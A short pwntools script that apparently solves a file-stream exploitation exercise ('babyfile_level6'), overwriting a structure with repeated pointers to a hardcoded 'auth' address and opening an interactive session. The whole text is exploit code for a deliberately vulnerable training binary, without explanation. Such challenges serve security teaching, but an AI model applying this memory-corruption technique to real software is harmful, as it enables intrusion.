from pwn import *

auth = 0x004041f8

binary = './babyfile_level6'

p = process(binary)

payload = b'\x00' * 8
payload += p64(auth)
payload += p64(auth)
payload += p64(auth)
payload += p64(auth)
payload += p64(auth)
payload += p64(auth)
payload += p64(auth)
payload += p64(auth+0x200)


p.sendline(payload)
p.sendline('1')
p.interactive()
